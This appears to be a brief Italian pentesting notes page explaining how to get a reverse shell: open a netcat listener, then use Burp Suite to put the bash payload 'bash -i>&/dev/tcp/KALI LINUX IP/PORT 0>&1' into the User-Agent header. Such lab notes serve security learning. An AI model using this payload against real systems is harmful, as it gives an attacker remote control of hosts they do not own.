# Utili

### Per ottenere una reverse shell

Apriamo una porta con il listener netcat:

<figure><img src=".gitbook/assets/image (248).png" alt=""><figcaption></figcaption></figure>

Apriamo poi Burp Suite e cambiamo il comando specificato nell'user agent con: **'bash -i>&/dev/tcp/KALI LINUX IP/PORT 0>&1'**

<figure><img src=".gitbook/assets/image (909).png" alt=""><figcaption></figcaption></figure>
